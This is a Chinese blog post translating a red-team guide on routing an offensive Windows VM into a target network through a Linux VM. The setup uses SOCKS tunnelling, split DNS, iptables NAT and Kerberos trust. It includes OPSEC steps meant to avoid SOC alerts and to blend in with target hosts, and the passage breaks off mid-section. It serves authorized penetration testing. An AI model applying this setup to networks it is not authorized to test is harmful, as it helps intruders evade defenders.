<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>ShadowMccc&#39;s Blog</title>
  <meta name="author" content="ShadowMccc">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
  <meta property="og:site_name" content="ShadowMccc&#39;s Blog"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/atom.xml" title="ShadowMccc&#39;s Blog" type="application/atom+xml">
  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  
  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-70812759-1');
</script>






<meta name="generator" content="Hexo 7.3.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">ShadowMccc&#39;s Blog</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class=""></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/categories" title="All the categories.">
			  <i class=""></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class=""></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class=""></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/atom.xml" title="Subscribe me.">
			  <i class=""></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 <div class="page-header logo">
  <h1>ShadowMccc&#39;s Blog<span class="blink-fast">|</span></h1>
</div>

<div class="row page">

	
	<div class="col-md-9">
	

		<div class="slogan">


		<i class="fa fa-heart blink-slow"></i>

		Beneath this mask there is more than fIesh.Beneath this mask there is an idea, Mr. Creedy.And ideas are bulletproof.

</div>    

		<div id="top_search"></div>
		<div class="mypage">
		
		<!-- title and entry -->
		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2024/12/10/OffensiveWindows攻击平台搭建/" >OffensiveWindows攻击平台搭建</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2024-12-10  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<p>曾经有人说你还用proxychains，我现在都不用这个了，问他那用什么？不说。原来是看了洋大人的文章弄了一个windows攻击虚拟机，但是为什么要用洋大人的东西装逼呢？😅</p>
<p>下面是对洋大人的文章的翻译（chatgpt）</p>
<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.bitsadmin.com/living-off-the-foreign-land-windows-as-offensive-platform">https://blog.bitsadmin.com/living-off-the-foreign-land-windows-as-offensive-platform</a></p>
<p>首先在vmware中创建一个新的lan段，lan段不会自动分配ip</p>
<h1><span id="设置linux">设置Linux</span></h1><h2><span id="设置ip">设置IP</span></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/network/interfaces</span><br><span class="line"></span><br><span class="line"> auto eth1</span><br><span class="line"> iface eth1 inet static</span><br><span class="line">   address 172.16.0.2</span><br><span class="line">   netmask 255.255.255.0</span><br><span class="line">   gateway 172.16.0.2</span><br></pre></td></tr></table></figure>

<h2><span id="重启网络服务并禁用eth1">重启网络服务并禁用eth1</span></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service networking restart</span><br><span class="line">ip link set eth1 down</span><br></pre></td></tr></table></figure>

<h2><span id="允许系统在不同的网络接口之间转发-ip-数据包">允许系统在不同的网络接口之间转发 IP 数据包</span></h2><p><code>ip_forward</code> 是一个内核参数，用于控制是否允许系统在不同的网络接口之间转发 IP 数据包。启用 <code>ip_forward</code> 可以使 Linux 机器充当路由器，允许其转发从一个接口接收到的数据包到另一个接口，从而实现不同网络之间的通信。</p>
<p><code>sysctl -w net.ipv4.ip_forward=1</code></p>
<h2><span id="dns服务器">DNS服务器</span></h2><p>在进攻性设置中，使用了 <strong>分割 DNS（Split DNS）</strong> 配置。此外，还可以选择在第二个 Linux 网络接口上配置一个 DHCP 服务器，以便自动分配 IP 地址给通过该接口连接的 Offensive Windows 虚拟机。为此，使用了 <strong>dnsmasq</strong> DNS 服务器软件，可以通过 Linux 包管理器进行安装。接下来，可以在 <code>/etc/dnsmasq.conf</code> 文件中更新配置，在该文件中，可以通过 C2 软件植入收集到的各种目标网络 DNS 服务器。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># Port</span><br><span class="line">port=5353</span><br><span class="line"></span><br><span class="line"># DHCP server</span><br><span class="line">dhcp-range=172.16.0.100,172.16.0.200,12h</span><br><span class="line">dhcp-option=option:dns-server,172.16.0.2</span><br><span class="line">dhcp-authoritative</span><br><span class="line"></span><br><span class="line"># Target network DNS server(s)</span><br><span class="line">server=/123.com/172.16.1.123</span><br><span class="line">server=/1.16.172.in-addr.arpa/172.16.1.123</span><br><span class="line"></span><br><span class="line"># Default DNS server</span><br><span class="line"></span><br><span class="line">server=1.0.0.1</span><br></pre></td></tr></table></figure>

<p>配置首先从设置 DNS 服务器的端口开始，端口设置为 5353。这样做的原因将在下一个小节中解释。</p>
<p>接下来，配置 DHCP 服务器，分配的 IP 地址范围是 <strong>172.16.0.100 到 172.16.0.200</strong>，并设置租约时间为 12 小时，同时 DNS 服务器的 IP 地址设置为 Linux 路由虚拟机的 IP 地址。然后，定义目标网络的域名，并为这些域配置相应的 DNS 服务器 IP 地址，如 <strong>172.16.1.123</strong>，这意味着每当请求访问这些域名时，DNS 查询将通过这个 IP 地址来解析域名。</p>
<p>带有 <code>in-addr.arpa</code> 的行不是必须的，但它们用于反向 DNS 查找，在进行 DNS 情报收集时可能会很有用。</p>
<p>最后，指定默认的 DNS 服务器，在这个例子中，设置为 Cloudflare DNS 服务器，但可以是任何公共 DNS 服务器。这个配置确保只有特定的请求会被发送到目标网络的 DNS 服务器，而其他的请求则都会被发送到公共 DNS 服务器，从而避免暴露在目标网络中。这样做的原因是，例如在启动 Burp 时，Burp 的更新器会发出到 portswigger.net 的 DNS 请求，这些请求会被发送到目标网络中的 DNS 服务器，可能会触发 SOC 团队的警报。通过这种设置，这些请求将直接发送到Cloudflare DNS 服务器，而不是目标网络的 DNS 服务器。</p>
<p>在 engagement 过程中，如果发现了更多的域名，也可以将它们添加到此文件中。确保在更新配置文件后重新启动 <code>dnsmasq</code> 服务，以使更改生效。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart dnsmasq</span><br><span class="line">ip link set eth1 up</span><br></pre></td></tr></table></figure>

<h2><span id="dns-server-and-udp-over-socks">DNS server and UDP over SOCKS</span></h2><p>正如之前讨论的，许多 SOCKS 服务器的实现不支持 UDP ASSOCIATE 功能，这意味着无法通过 SOCKS 隧道传输 UDP 流量。幸运的是，有一个解决方案。尽管默认情况下 DNS 使用 53&#x2F;UDP 端口，DNS 规范指出，较大的请求&#x2F;响应也可以通过 53&#x2F;TCP 执行，而 SOCKS 隧道支持这种方式。</p>
<p>为了实现这一功能，[LOFL 仓库](<a target="_blank" rel="noopener" href="http://github/">http://github</a> - bitsadmin&#x2F;lofl: Living Off the Foreign Land setup scripts)中的 <strong>dns_over_tcp.py</strong> 脚本提供了解决方案。该脚本执行以下操作：当脚本启动时，它会在 <strong>53&#x2F;UDP</strong> 和 <strong>5353&#x2F;TCP</strong> 端口上启动监听器。这也是为什么 <code>dnsmasq</code> DNS 服务器应该监听 <strong>5353</strong> 端口的原因，否则 <strong>53</strong> 端口会被占用。此外，脚本会解析配置文件(<strong>&#x2F;etc&#x2F;dnsmasq.conf</strong>)，根据配置的条目，选择需要将传入的 DNS 请求转换为通过 TCP 发出的 DNS 请求的域名。</p>
<p><img src="/images/73.png" alt="73"></p>
<p>当 <strong>dns_over_tcp.py</strong> 脚本在 <strong>53&#x2F;UDP</strong> 端口接收到 DNS 请求时，它会检查请求的记录。如果该记录与之前解析的 <code>dnsmasq</code> 配置中指定的域名匹配，那么脚本会构造一个通过 <strong>TCP</strong> 发送的 DNS 请求，并将其发送到 <code>dnsmasq</code> DNS 服务器的 <strong>5353&#x2F;TCP</strong> 端口（即 <strong>127.0.0.1:5353</strong>）。由于 <code>dnsmasq</code> 在其 TCP 端口接收到请求，它会通过 TCP 与为该域配置的服务器进行交互，从而解决了不支持 UDP 协议的问题。目标网络的 DNS 服务器返回的应答随后通过 TCP 从 <code>dnsmasq</code> 发送回脚本，脚本再通过 UDP 返回响应给发起 DNS 请求的客户端。</p>
<p>当脚本在 <strong>53&#x2F;UDP</strong> 端口接收到一个 DNS 请求，但该请求的域名未在 <code>dnsmasq</code> 配置中匹配时，脚本会通过 UDP 连接到 <code>dnsmasq</code> 的 <strong>5353&#x2F;UDP</strong> 端口。由于传入请求是通过 UDP 发出的，<code>dnsmasq</code> 会使用 UDP 连接到默认的 DNS 服务器（<strong>1.0.0.1</strong>），并将响应返回给脚本，脚本随后将响应返回给发起 DNS 请求的客户端。</p>
<p>一旦 <code>dnsmasq</code> 配置完成并且脚本正在运行，还可以将 Linux 路由虚拟机的 <strong>nameserver</strong> 设置为其自身，方法是执行以下命令，其中第二个命令是可选的，用于锁定文件以防止修改：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;nameserver 127.0.0.1&quot; | sudo tee /etc/resolv.conf</span><br><span class="line">sudo chattr +i /etc/resolv.conf # 可选：锁定文件以防止修改</span><br></pre></td></tr></table></figure>

<h2><span id="tun2socks">Tun2socks</span></h2><p>一旦 SOCKS 端口开始监听并提供对目标网络的访问，就需要配置 tun2socks。可以从 tun2socks GitHub 仓库获取 Linux 版本的 tun2socks 工具。</p>
<p>tun2socks 工具需要设置一个新的隧道适配器。可以使用以下命令来完成这一操作。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ip tuntap add mode tun dev tun1</span><br><span class="line">ip addr add 198.18.0.1/15 dev tun1</span><br><span class="line">ip link set dev tun1 up</span><br></pre></td></tr></table></figure>

<p>使用这些命令，创建了一个新的隧道接口，名为 tun1。接下来，将一个 IP 地址分配给新创建的接口。该 IP 地址属于一个专门用于基准测试的地址块，因此可以安全地假设它不会被目标网络使用。最后，该接口被启用并上线。在 LOFL 仓库中，有一个名为 create_tun.sh 的工具，能够自动执行这些操作。以下是可以使用的命令行参数。</p>
<p>在创建接口之后，可以使用 tun2socks 命令行将该接口与 SOCKS 服务器连接，并将所有流量通过 SOCKS 隧道转发到该接口。该命令行如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tun2socks -device tun1 -proxy socks5://127.0.0.1:1080</span><br></pre></td></tr></table></figure>

<p>如上所示，<code>-device</code> 参数指定了它应该使用的接口来接收流量，然后将该流量通过 SOCKS 隧道转发。<code>-proxy</code> 参数指定了流量到达设备后应转发到哪里。代理协议（在本例中是 <strong>socks5</strong>）有多个选项，对于 LOFL，相关的选项是 <strong>socks4</strong> 或 <strong>socks5</strong>。有关代理协议的更多选项，可以参考 tun2socks wiki 上的 <strong>Proxy Models</strong> 页面。</p>
<p>现在，tun1 接口已经可以用于将流量引入目标网络，但在使用之前，还需要配置另外两个设置。</p>
<h2><span id="routes">Routes</span></h2><p>目前，由于尚未为 tun1 接口配置路由，因此不会有任何流量通过该接口发送，所有流量将通过默认路由发送。这样的设置是合理的，因为与分割 DNS 设置类似，从 OPSEC 角度考虑，重要的是只有相关的流量被路由到目标网络。</p>
<p>根据受害者系统的 IP 配置，该系统用于 SOCKS 中转（pivoting）以及对域名设置进行的任何侦察，可以将 IP 地址添加到路由表中。以 vensec.com 实验室为例，以下 IP 范围可以添加到路由表中，使它们通过 tun1 上的 SOCKS 隧道进行路由。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ip route add 172.16.3.0/24 via 198.18.0.1 dev tun1</span><br><span class="line">ip route add 172.16.102.0/24 via 198.18.0.1 dev tun1</span><br></pre></td></tr></table></figure>

<p>另外，在 LOFL 仓库中提供了 add_routes.sh 工具，可以帮助创建这些路由。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Usage: add_routes.sh &lt;subnet_file&gt; &lt;interface&gt; [gateway_ip]</span><br></pre></td></tr></table></figure>

<p>此时，从 Linux 路由虚拟机已经可以连接到目标网络中的系统。然而，还需要一步操作才能使 Offensive Windows 虚拟机 也能够访问目标网络。</p>
<h2><span id="iptables">Iptables</span></h2><p>由于 Offensive Windows 虚拟机 位于不同的网络段，因此需要为 Linux 路由虚拟机 配置网络地址转换（NAT），以便正确地伪装来自 Offensive Windows 虚拟机 的流量。这样，Offensive Windows 虚拟机 就能够将流量发送到其默认网关（即 Linux 路由虚拟机），然后该流量会根据配置的路由转发到适当的网关，这些网关可以是互联网（默认网关）或之前小节中配置的特定目标网络子网。可以使用以下命令来完成此操作:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># Internet</span><br><span class="line">iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</span><br><span class="line">iptables -A FORWARD -i eth0 -o eth1 -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br><span class="line">iptables -A FORWARD -i eth1 -o eth0 -j ACCEPT</span><br><span class="line"></span><br><span class="line"># Target network</span><br><span class="line">iptables -t nat -A POSTROUTING -o tun1 -j MASQUERADE</span><br><span class="line">iptables -A FORWARD -i tun1 -o eth1 -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br><span class="line">iptables -A FORWARD -i eth1 -o tun1 -j ACCEPT</span><br></pre></td></tr></table></figure>

<p>另外，在 LOFL 仓库中提供了 iptables_nat.sh 工具，可以帮助创建 iptables NAT 规则:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Create iptables NAT v1.0</span><br><span class="line">@bitsadmin - https://github.com/bitsadmin/lofl</span><br><span class="line"></span><br><span class="line">Usage: iptables_nat.sh [-d] [-f] INPUT OUTPUT</span><br><span class="line"></span><br><span class="line">Parameters:</span><br><span class="line">-d:    Delete the iptables rule</span><br><span class="line">-f:    Skip user confirmation prompt</span><br><span class="line">INPUT:  Input interface</span><br><span class="line">OUTPUT:  Output interface</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">Create NAT from ens36 to tun1</span><br><span class="line">iptables_nat.sh ens36 tun1</span><br><span class="line"></span><br><span class="line">Delete NAT from ens36 to tun1</span><br><span class="line">iptables_nat.sh -d ens36 tun1</span><br><span class="line"></span><br><span class="line">Delete NAT from ens36 to tun1 without prompt</span><br><span class="line">iptables_nat.sh -d -f ens36 tun1</span><br></pre></td></tr></table></figure>

<p>由于使用了分割隧道（split tunneling），需要为 eth1到 eth0（默认网关）接口以及 eth1到 tun1（目标网络）接口配置 iptables 规则。</p>
<h1><span id="设置windows">设置Windows</span></h1><h2><span id="连接配置文件">连接配置文件</span></h2><p>从提升的 PowerShell 中，将连接到 Linux 路由虚拟机的网络接口的连接配置文件设置为私有。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># View current settings</span><br><span class="line">Get-NetConnectionProfile</span><br><span class="line"></span><br><span class="line"># Set connection profile to Private</span><br><span class="line">Set-NetConnectionProfile -InterfaceAlias &quot;Ethernet&quot; -NetworkCategory Private</span><br><span class="line"></span><br><span class="line"># Validate settings</span><br><span class="line">Get-NetConnectionProfile</span><br></pre></td></tr></table></figure>

<h2><span id="winrm">WinRM</span></h2><p>配置 WinRM 以信任所有远程主机，允许 WinRM 使用 Kerberos 认证访问远程系统。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set-Item -Path WSMan:\localhost\Client\TrustedHosts -Value * -Force</span><br><span class="line">Restart-Service WinRM</span><br></pre></td></tr></table></figure>

<h2><span id="浏览器">浏览器</span></h2><p>由于 Internet Explorer 已被弃用，微软正在积极推动用户迁移到 Microsoft Edge。然而，在某些情况下，仍然需要使用 Internet Explorer，因此必须进行配置。根据目标组织使用的浏览器，出于 OPSEC（操作安全）考虑，应该安装像 Google Chrome 这样的浏览器。基于 Chromium 的浏览器（如 Microsoft Edge 和 Google Chrome）不会在启动浏览器的进程下生成其进程，这导致凭证信息不会被继承（稍后会详细介绍）。因此，需要调整一些设置。</p>
<table>
<thead>
<tr>
<th>浏览器</th>
<th>命令行</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>Internet Explorer</td>
<td>“C:\Program Files\Internet Explorer\iexplore.exe”</td>
<td>由于微软正在推行 Edge，需要禁用 IEToEdge 浏览器助手对象（BHO）。可以使用以下命令行实现： reg.exe add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Ext\CLSID &#x2F;T REG_SZ &#x2F;V {1FD49718-1D00-4B19-AF5F-070AF6D5D54C} &#x2F;D 0 &#x2F;F。如果由于某些原因仍无法启动 Internet Explorer，一种有效的方法是删除磁盘上的 ie_to_edge_bho*.dll 文件。更多选项请参考 <a target="_blank" rel="noopener" href="https://www.winhelponline.com/blog/disable-auto-redirect-unsupported-sites-ie-to-edge/">https://www.winhelponline.com/blog/disable-auto-redirect-unsupported-sites-ie-to-edge/</a></td>
</tr>
<tr>
<td>Microsoft Edge</td>
<td>“C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe”</td>
<td>转到设置 -&gt; 系统和性能 -&gt; 禁用 “启动加速”和“关闭 Microsoft Edge 后继续运行后台扩展和应用”</td>
</tr>
<tr>
<td>Google Chrome</td>
<td>“C:\Program Files\Google\Chrome\Application\chrome.exe” –no-sandbox</td>
<td>使用时，需要通过 –no-sandbox 参数启动 chrome.exe</td>
</tr>
</tbody></table>
<h2><span id="禁用回滚到ntlm">禁用回滚到NTLM</span></h2><p>这是一个可选设置，可能会阻止访问目标域中的某些资源。然而，出于 OPSEC（操作安全）考虑，建议在 Kerberos 认证失败时禁用回退到 NTLM 认证。这个设置可以通过 GUI 配置或修改注册表项来实现，并且一旦修改后立即生效。因此，也可以默认将其关闭，但如果明确决定某项活动可以使用 NTLM 认证，则可以暂时启用。</p>
<p>通过 GUI 配置此设置的方法是：启动 gpedit.msc，然后导航到 计算机配置 -&gt; Windows 设置 -&gt; 安全设置 -&gt; 本地策略 -&gt; 安全选项。打开 “网络安全：限制 NTLM：对远程服务器的 NTLM 出站流量” 设置，并将其设置为 “拒绝所有”。</p>
<p>或者，您也可以使用 PowerShell 在注册表中配置此设置。该设置的可能值为：</p>
<ul>
<li><strong>0</strong> - 允许所有</li>
<li><strong>1</strong> - 审计所有</li>
<li><strong>2</strong> - 拒绝所有</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0 -Name RestrictSendingNTLMTraffic -Value 2 -Force</span><br></pre></td></tr></table></figure>

<h2><span id="攻击性-linux虚拟机每个域的配置">攻击性 Linux虚拟机：每个域的配置</span></h2><h3><span id="cldap">CLDAP</span></h3><p>每个域都需要启动一个实用工具，即 <code>cldaproxy.sh</code>，该工具也可以从 LOFL 仓库中获取。CLDAP 代表无连接 LDAP，它是通过端口 389&#x2F;UDP 进行的 LDAP 通信（与 LDAP 在端口 389&#x2F;TCP 上的通信相对）。尽管可以在下一节中讨论如何减少 Windows 对 CLDAP 的使用，但在某些情况下，Windows 仍然会使用它。由于 CLDAP 协议（UDP）与 LDAP 协议（TCP）完全相同，因此可以使用 <code>iptables</code> 拦截来自 Windows 主机的任何 CLDAP 流量，利用 <code>socat</code> 将其转换为 LDAP 流量，然后对任何响应执行反向过程。命令行参数如下。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">CLDAProxy v1.0</span><br><span class="line">@bitsadmin - https://github.com/bitsadmin/lofl</span><br><span class="line"></span><br><span class="line">Convert CLDAP (UDP) traffic to LDAP (TCP)</span><br><span class="line"></span><br><span class="line">Usage: cldaproxy.sh &lt;domain&gt; [dc_ip]</span><br><span class="line"></span><br><span class="line">Parameters:</span><br><span class="line">domain:  Domain name to resolve and use to proxy to</span><br><span class="line">dc_ip:   Use explicit server IP instead of deriving it from the domain</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">Proxy CLDAP to LDAP for domain ad.bitsadmin.com</span><br><span class="line">cldaproxy.sh ad.bitsadmin.com</span><br><span class="line"></span><br><span class="line">Proxy CLDAP to LDAP making use of DC 10.0.10.10</span><br><span class="line">cldaproxy.sh ad.bitsadmin.com 10.0.10.10</span><br></pre></td></tr></table></figure>

<p>尽管大部分配置需要在 Windows 上完成，但在攻击性 Windows 虚拟机需要访问新域时，有三个操作需要执行。</p>
<h3><span id="dns">DNS</span></h3><p>将所有发现的域添加到 <code>/etc/dnsmasq.conf</code> 文件中，配置如下所示。更新配置后，请确保重启 <code>dnsmasq</code> 服务以及 <code>dns_over_tcp.py</code> 脚本。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">server=/ad.bitsadmin.com/10.0.10.10</span><br><span class="line">server=/ad.bitsadmin.com/10.0.10.11</span><br><span class="line">server=/10.0.10.in-addr.arpa/10.0.10.10</span><br><span class="line">server=/10.0.10.in-addr.arpa/10.0.10.11</span><br></pre></td></tr></table></figure>

<h3><span id="路由">路由</span></h3><p>根据已经配置的通过 <code>tun2socks</code> 的路由，可能需要添加额外的路由来访问已添加的额外域。这些路由可以通过以下命令添加：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip route add 10.0.10.0/24 via 198.18.0.1 dev tun1</span><br></pre></td></tr></table></figure>

<h2><span id="攻击性-windows-虚拟机每个域的配置">攻击性 Windows 虚拟机：每个域的配置</span></h2><p>攻击性 Windows 虚拟机的第二部分配置包括对其进行修改，使其能够与目标域中的主机进行融合。融合的一部分是确保与域中所有主机一样使用 Kerberos 认证，而不是 NTLM 认证。为了实现这一点，攻击性 Windows 虚拟机必须信任目标域，并因此愿意使用其（Kerberos）凭证材料。</p>
<h3><span id="主机">主机</span></h3><p>在攻击性 Windows 虚拟机与其他系统通信的日志中，通常会记录计算机名称，有时甚至会记录攻击性 Windows 虚拟机的内部 IP 地址（即 Linux 路由虚拟机与攻击性 Windows 虚拟机之间使用的 IP 地址）。为了保持最大程度的 OPSEC（操作安全），使攻击性 Windows 虚拟机与目标组织中使用的主机名甚至 IP 地址相匹配是非常有用的。攻击性 Windows 虚拟机的计算机名称可以在计算机设置中简单更改，修改后需要重启才能生效。要更新 IP 配置，需要更新 Linux 路由虚拟机的 IP 地址，如果使用了 DHCP 服务器，还需要更新相应的地址范围。有关详细说明，请参考第 1 部分中的《攻击性设置：Linux 路由虚拟机》一节。更新配置后，请确保重启 <code>dnsmasq</code> 服务并在 Windows 上刷新 IP 配置。</p>
<h3><span id="cldap">CLDAP</span></h3><p>如前所述，除了运行 <code>cldaproxy.sh</code> 工具外，还可以配置 Windows 来减少使用无连接 LDAP（CLDAP）。这可以通过 Windows 的 <code>ksetup.exe</code> 命令行工具来实现。对于每个要访问的域，可以执行以下命令，其中 <code>AD.BITSADMIN.COM</code>（<code>ksetup</code> 更倾向于使用大写字母）是目标域。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ksetup.exe /SetRealmFlags AD.BITSADMIN.COM tcpsupported</span><br></pre></td></tr></table></figure>

<h3><span id="证书">证书</span></h3><p>Active Directory 的信任很大程度上依赖于本地系统是否信任所提供的证书。换句话说，攻击性 Windows 虚拟机需要将目标域的证书颁发机构添加到其本地的“受信任根证书颁发机构”列表中。可以通过多种方式获取目标域的证书（.crt 文件），以下段落将讨论这些方法。由于攻击性 Windows 虚拟机应该已经用于这些脚本，但目前仍在配置中，可能会遇到“先有鸡还是先有蛋”的问题。在这种情况下，最佳的做法是继续阅读文章的其余部分，直到第 3 部分的《Living off the Foreign Land》章节，然后再返回此处配置证书。</p>
<h4><span id="选项-1通过-ldap-获取企业-ntauth-存储">选项 #1：通过 LDAP 获取企业 NTAuth 存储</span></h4><p>一种方法是通过 LDAP 获取根证书，可以使用 PowerShell 或 Sysinternals 的 ADExplorer 工具。使用 PowerShell 收集根证书时，可以使用以下代码，其中 <code>$domain</code> 和 <code>$dc</code> 变量需要更新为目标域和域控制器。<code>.crt</code> 文件将写入 PowerShell 当前目录。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$domain = &#x27;ad.bitsadmin.com&#x27;</span><br><span class="line">$server = &#x27;DC1.ad.bitsadmin.com&#x27;</span><br><span class="line">$ldapdcstr = &#x27;DC=&#x27; + (($domain.Split(&#x27;.&#x27;)) -join &#x27;,DC=&#x27;)</span><br><span class="line">$certs = (Get-ADObject -SearchBase &quot;CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,$ldapdcstr&quot; -Filter * -Properties cACertificate -Server $server).cACertificate</span><br><span class="line">$certs | ForEach-Object &#123;</span><br><span class="line">   $c = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2</span><br><span class="line">   $c.Import($_)</span><br><span class="line">   $c</span><br><span class="line">   [System.IO.File]::WriteAllBytes(&quot;$pwd\$($c.DnsNameList[0].Unicode).crt&quot;, $_)</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>另一种方法是使用 Sysinternals 的 ADExplorer 或其他 LDAP 客户端。导航到以下路径，其中 <code>DC=</code> 代表目标环境的域组件：</p>
